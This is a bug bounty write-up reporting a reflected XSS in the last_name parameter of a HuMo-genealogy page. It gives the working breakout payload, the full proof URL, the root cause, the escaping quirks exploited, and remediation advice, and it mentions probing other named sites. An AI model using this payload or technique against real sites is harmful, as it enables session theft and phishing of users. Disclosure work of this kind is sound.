# Reflected XSS — Private Bug Bounty Program

**Program:** colani Bug Bounty via Open Bug Bounty
**Scope:** `*.Private Program`
**Type:** Reflected Cross Site Scripting (XSS)
**Severity:** Medium — requires 1 click, executes in victim session
**Researcher:** Fahd Aguenouz
**Date:** Oct 2026
**Status:** Submitted private, awaiting triage

> Tested non-intrusive only. Single GET requests, benign `alert()` proof. No data accessed, no accounts created.

## Summary

Reflected XSS in `last_name` parameter on `list_names.php`. Input is reflected raw into the `action` attribute of `form#frqnames`. Double quotes break out, angle brackets stay raw, so `"><svg onload=...>` becomes a real tag and fires on page load.

## PoC

Submission URL (must show OPENBUGBOUNTY for OBB triage):
```
https://PrivateProgram/index.php?page=list_names.php&tree_id=1&last_name=%22%3E%3Csvg%20onload%3Dalert%28%2FOPENBUGBOUNTY%2F%29%3E
```

Raw payload:
```html
"><svg onload=alert(/OPENBUGBOUNTY/)>
```

Early test that confirmed breakout (no JS, safe):
```
https://PrivateProgram/index.php?page=list_names.php&tree_id=1&last_name=OBB%22%3E%3CXYZ%3ETEST
```

## Steps to reproduce

1. Open PoC URL in clean Chrome/Firefox with JS enabled
2. Page loads `Private Program`
3. Popup `OPENBUGBOUNTY` fires immediately on load
4. View Source (`Ctrl+U`) shows:
```html
<form method="POST" action="index.php?page=list_names&tree_id=1&last_name=\"><svg onload=alert(/OPENBUGBOUNTY/)>" style="display:inline;" id="frqnames">
```

Note: first tries with `alert(1)` popped, `alert('OBB-XSS')` did not. Reason below.

## Root cause

In `list_names.php`, `$_GET['last_name']` is printed directly into HTML:

```php
// vulnerable (simplified)
<form action="index.php?page=list_names&tree_id=1&last_name=<?php echo $_GET['last_name']; ?>">
```

Encoding observed:
* `"` -> `\"` — backslash added, but HTML ignores `\`, so `"` still closes `action="..."`
* `< >` -> raw, not `&lt; &gt;`
* `'` -> `\'` — breaks `alert('XSS')` into `alert(\'XSS\')` = JS syntax error
* `/ ( )` untouched

So `"><svg onload=alert(1)>` works, `alert('text')` fails. Using `alert(/OPENBUGBOUNTY/)` avoids quotes and satisfies OBB rule that popup must contain OPENBUGBOUNTY.

Site is HuMo-genealogy (open-source genealogy CMS). Same pattern likely in other `list_*` pages, but only this one verified to avoid extra requests.

## Impact

Executes as `Private Program` in victim context after 1 click:

* Session hijack if cookies lack HttpOnly — reuse victim session for `Inloggen`, `Gebruikersinstellingen`, `mailform`
* Theft of private genealogy PII — family pages `?page=family&id=F...&main_person=I...`, birth/death dates, members hidden for privacy
* Phishing on trusted domain — fake login overlay, credential harvest
* Actions as victim — search POSTs, settings changes, contact mails via victim session

Reflected, so needs crafted link. Still practical — domain is trusted, content is sensitive.

## Fix for owner

Encode for HTML attribute context:

```php
echo htmlspecialchars($_GET['last_name'], ENT_QUOTES, 'UTF-8');
```

This turns `"` to `&quot;`, `<` to `&lt;`, `>` to `&gt;`, `'` to `&#039;`.

Hardening:
* Allowlist `last_name`: `A-Z a-z space - '`, plus value `all`. Reject `<> "`
* Cookies: `HttpOnly + Secure + SameSite=Lax`
* CSP: `script-src 'self'` to block inline event handlers

## What I learned

* Drako.it, picclick.eu, proantic.com: all filtered (`&quot;`, `&lt;`) or WAF 403 on `on*=` — ruled out fast, moved on
* This host: no WAF on this endpoint, `"` raw enough for breakout, `<>` raw — classic old PHP reflection
* OBB needs exact string `OPENBUGBOUNTY` in popup — `alert(1)` proves bug but gets rejected
* Rate limits matter — proantic temp-banned PC + phone after ~5 rapid 403s. One request at a time after that.

## Files

* `README.md` — this writeup
* PoC video + screenshots stored with OBB submission (private)

## Timeline

* Oct 2026: recon key.php, list_names.php params
* Oct 2026: confirmed reflection in `frqnames` action, bypassed quote issue with quoteless `alert(1)`, then `alert(/OPENBUGBOUNTY/)`
* Oct 2026: submitted private to Open Bug Bounty

> Report authored by Fahd Aguenouz